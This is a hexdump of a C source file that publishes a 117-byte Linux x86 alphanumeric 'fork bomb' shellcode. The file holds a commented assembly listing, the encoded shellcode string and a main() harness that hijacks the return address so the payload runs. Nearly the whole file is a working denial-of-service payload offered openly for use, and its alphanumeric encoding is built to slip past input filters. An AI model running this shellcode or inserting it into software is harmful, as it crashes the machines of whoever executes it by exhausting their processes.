00000000  2f 2a 0a 20 7c 20 54 69  74 6c 65 3a 20 4c 69 6e  |/*. | Title: Lin|
00000010  75 78 2f 78 38 36 20 61  6c 70 68 61 6e 75 6d c3  |ux/x86 alphanum.|
00000020  83 c2 a9 72 69 63 20 42  6f 6d 62 20 46 4f 52 4b  |...ric Bomb FORK|
00000030  20 53 68 65 6c 6c 63 6f  64 65 20 31 31 37 20 42  | Shellcode 117 B|
00000040  79 74 65 73 0a 20 7c 20  54 79 70 65 3a 20 53 68  |ytes. | Type: Sh|
00000050  65 6c 6c 63 6f 64 65 0a  20 7c 20 41 75 74 68 6f  |ellcode. | Autho|
00000060  72 3a 20 61 67 69 78 0a  20 7c 20 50 6c 61 74 66  |r: agix. | Platf|
00000070  6f 72 6d 3a 20 4c 69 6e  75 78 20 58 38 36 0a 2a  |orm: Linux X86.*|
00000080  2f 0a 0a 2f 2a 0a 64 65  63 20 65 73 70 0a 20 20  |/../*.dec esp.  |
00000090  20 20 20 20 20 20 64 65  63 20 65 73 70 0a 20 20  |      dec esp.  |
*
000000c0  20 20 20 20 20 20 70 75  73 68 20 64 77 6f 72 64  |      push dword|
000000d0  20 30 78 35 38 34 39 34  37 34 31 0a 20 20 20 20  | 0x58494741.    |
000000e0  20 20 20 20 70 6f 70 20  65 61 78 0a 20 20 20 20  |    pop eax.    |
000000f0  20 20 20 20 78 6f 72 20  65 61 78 2c 20 30 78 35  |    xor eax, 0x5|
00000100  38 34 39 34 37 34 31 0a  20 20 20 20 20 20 20 20  |8494741.        |
00000110  64 65 63 20 65 61 78 20  0a 20 20 20 20 20 20 20  |dec eax .       |
00000120  20 70 6f 70 20 65 64 78  0a 20 20 20 20 20 20 20  | pop edx.       |
00000130  20 70 75 73 68 20 65 73  70 0a 20 20 20 20 20 20  | push esp.      |
00000140  20 20 70 6f 70 20 65 63  78 20 0a 20 20 20 20 20  |  pop ecx .     |
00000150  20 20 20 70 75 73 68 20  65 61 78 0a 20 20 20 20  |   push eax.    |
00000160  20 20 20 20 70 75 73 68  20 65 63 78 0a 20 20 20  |    push ecx.   |
00000170  20 20 20 20 20 70 75 73  68 20 65 64 78 0a 20 20  |     push edx.  |
00000180  20 20 20 20 20 20 70 75  73 68 20 65 61 78 0a 20  |      push eax. |
00000190  20 20 20 20 20 20 20 70  75 73 68 20 65 73 70 0a  |       push esp.|
000001a0  20 20 20 20 20 20 20 20  70 75 73 68 20 65 62 70  |        push ebp|
000001b0  0a 20 20 20 20 20 20 20  20 70 75 73 68 20 65 64  |.        push ed|
000001c0  78 0a 20 20 20 20 20 20  20 20 70 75 73 68 20 65  |x.        push e|
000001d0  64 69 0a 20 20 20 20 20  20 20 20 70 6f 70 61 64  |di.        popad|
000001e0  0a 20 20 20 20 20 20 20  20 64 65 63 20 65 63 78  |.        dec ecx|
000001f0  0a 20 20 20 20 20 20 20  20 70 75 73 68 20 64 77  |.        push dw|
00000200  6f 72 64 20 30 78 34 35  35 32 35 36 34 39 0a 20  |ord 0x45525649. |
00000210  20 20 20 20 20 20 20 64  65 63 20 65 63 78 0a 20  |       dec ecx. |
00000220  20 20 20 20 20 20 20 78  6f 72 20 5b 65 63 78 5d  |       xor [ecx]|
00000230  2c 20 62 68 0a 20 20 20  20 20 20 20 20 70 75 73  |, bh.        pus|
00000240  68 20 77 6f 72 64 20 30  78 35 34 34 35 0a 20 20  |h word 0x5445.  |
00000250  20 20 20 20 20 20 70 6f  70 20 64 78 0a 20 20 20  |      pop dx.   |
00000260  20 20 20 20 20 78 6f 72  20 5b 65 63 78 5d 2c 20  |     xor [ecx], |
00000270  64 68 0a 20 20 20 20 20  20 20 20 64 65 63 20 65  |dh.        dec e|
00000280  63 78 0a 20 20 20 20 20  20 20 20 78 6f 72 20 5b  |cx.        xor [|
00000290  65 63 78 5d 2c 20 62 68  0a 20 20 20 20 20 20 20  |ecx], bh.       |
000002a0  20 70 75 73 68 20 77 6f  72 64 20 30 78 34 32 35  | push word 0x425|
000002b0  35 0a 20 20 20 20 20 20  20 20 70 6f 70 20 64 78  |5.        pop dx|
000002c0  0a 20 20 20 20 20 20 20  20 78 6f 72 5b 65 63 78  |.        xor[ecx|
000002d0  5d 2c 20 64 68 0a 20 20  20 20 20 20 20 20 64 65  |], dh.        de|
000002e0  63 20 65 63 78 0a 20 20  20 20 20 20 20 20 78 6f  |c ecx.        xo|
000002f0  72 20 5b 65 63 78 5d 2c  20 62 68 0a 20 20 20 20  |r [ecx], bh.    |
00000300  20 20 20 20 70 75 73 68  20 77 6f 72 64 20 30 78  |    push word 0x|
00000310  33 36 33 36 0a 20 20 20  20 20 20 20 20 70 6f 70  |3636.        pop|
00000320  20 64 78 0a 20 20 20 20  20 20 20 20 78 6f 72 20  | dx.        xor |
00000330  5b 65 63 78 5d 2c 20 64  68 0a 20 20 20 20 20 20  |[ecx], dh.      |
00000340  20 20 64 65 63 20 65 63  78 0a 20 20 20 20 20 20  |  dec ecx.      |
00000350  20 20 70 75 73 68 20 64  77 6f 72 64 20 30 78 36  |  push dword 0x6|
00000360  62 36 65 37 35 36 61 0a  20 20 20 20 20 20 20 20  |b6e756a.        |
00000370  78 6f 72 20 5b 65 63 78  5d 2c 20 62 68 0a 20 20  |xor [ecx], bh.  |
00000380  20 20 20 20 20 20 70 75  73 68 20 77 6f 72 64 20  |      push word |
00000390  30 78 35 39 37 34 0a 20  20 20 20 20 20 20 20 70  |0x5974.        p|
000003a0  6f 70 20 64 78 0a 20 20  20 20 20 20 20 20 78 6f  |op dx.        xo|
000003b0  72 20 5b 65 63 78 5d 2c  20 64 68 0a 20 20 20 20  |r [ecx], dh.    |
000003c0  20 20 20 20 64 65 63 20  65 63 78 0a 20 20 20 20  |    dec ecx.    |
000003d0  20 20 20 20 70 75 73 68  20 77 6f 72 64 20 30 78  |    push word 0x|
000003e0  33 36 33 36 0a 20 20 20  20 20 20 20 20 70 6f 70  |3636.        pop|
000003f0  20 64 78 0a 20 20 20 20  20 20 20 20 78 6f 72 20  | dx.        xor |
00000400  5b 65 63 78 5d 2c 20 64  68 0a 20 20 20 20 20 20  |[ecx], dh.      |
00000410  20 20 64 65 63 20 65 63  78 0a 20 20 20 20 20 20  |  dec ecx.      |
00000420  20 20 70 75 73 68 20 77  6f 72 64 20 30 78 37 37  |  push word 0x77|
00000430  36 46 0a 20 20 20 20 20  20 20 20 70 6f 70 20 64  |6F.        pop d|
00000440  78 0a 20 20 20 20 20 20  20 20 78 6f 72 20 5b 65  |x.        xor [e|
00000450  63 78 5d 2c 20 64 68 0a  20 20 20 20 20 20 20 20  |cx], dh.        |
00000460  70 75 73 68 20 65 73 70  0a 20 20 20 20 20 20 20  |push esp.       |
00000470  20 70 75 73 68 20 65 73  69 0a 20 20 20 20 20 20  | push esi.      |
00000480  20 20 70 6f 70 20 65 63  78 0a 20 20 20 20 20 20  |  pop ecx.      |
00000490  20 20 78 6f 72 20 5b 65  63 78 20 2b 20 31 31 36  |  xor [ecx + 116|
000004a0  5d 2c 20 62 68 0a 20 20  20 20 20 20 20 20 70 75  |], bh.        pu|
000004b0  73 68 20 77 6f 72 64 20  30 78 37 30 36 35 0a 20  |sh word 0x7065. |
000004c0  20 20 20 20 20 20 20 70  6f 70 20 64 78 0a 20 20  |       pop dx.  |
000004d0  20 20 20 20 20 20 78 6f  72 20 5b 65 63 78 20 2b  |      xor [ecx +|
000004e0  20 31 31 36 5d 2c 20 64  68 0a 20 20 20 20 20 20  | 116], dh.      |
000004f0  20 20 64 65 63 20 65 73  70 0a 2a 2f 0a 0a 0a 23  |  dec esp.*/...#|
00000500  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
00000510  3e 0a 0a 0a 63 68 61 72  20 73 68 65 6c 6c 63 6f  |>...char shellco|
00000520  64 65 5b 5d 20 3d 0a 0a  22 4c 4c 4c 4c 68 41 47  |de[] =.."LLLLhAG|
00000530  49 58 58 35 41 47 49 58  48 5a 54 59 50 51 52 50  |IXX5AGIXHZTYPQRP|
00000540  54 55 52 57 61 49 68 49  56 52 45 49 30 39 66 68  |TURWaIhIVREI09fh|
00000550  45 54 66 5a 30 31 49 30  39 66 68 55 42 66 5a 30  |ETfZ01I09fhUBfZ0|
00000560  31 49 30 39 66 68 36 36  66 5a 30 31 49 68 6a 75  |1I09fh66fZ01Ihju|
00000570  6e 6b 30 39 66 68 74 59  66 5a 30 31 49 66 68 36  |nk09fhtYfZ01Ifh6|
00000580  36 66 5a 30 31 49 66 68  6f 77 66 5a 30 31 54 56  |6fZ01IfhowfZ01TV|
00000590  59 30 79 74 66 68 65 70  66 5a 30 71 74 4c 22 3b  |Y0ytfhepfZ0qtL";|
000005a0  0a 0a 0a 69 6e 74 20 6d  61 69 6e 28 69 6e 74 20  |...int main(int |
000005b0  61 72 67 63 2c 20 63 68  61 72 20 2a 2a 61 72 67  |argc, char **arg|
000005c0  76 29 20 7b 0a 20 20 20  20 20 20 20 20 69 6e 74  |v) {.        int|
000005d0  20 2a 72 65 74 3b 0a 20  20 20 20 20 20 20 20 72  | *ret;.        r|
000005e0  65 74 20 3d 20 28 69 6e  74 20 2a 29 26 72 65 74  |et = (int *)&ret|
000005f0  20 2b 20 32 3b 0a 20 20  20 20 20 20 20 20 28 2a  | + 2;.        (*|
00000600  72 65 74 29 20 3d 20 28  69 6e 74 29 20 73 68 65  |ret) = (int) she|
00000610  6c 6c 63 6f 64 65 3b 0a  7d                       |llcode;.}|
00000619
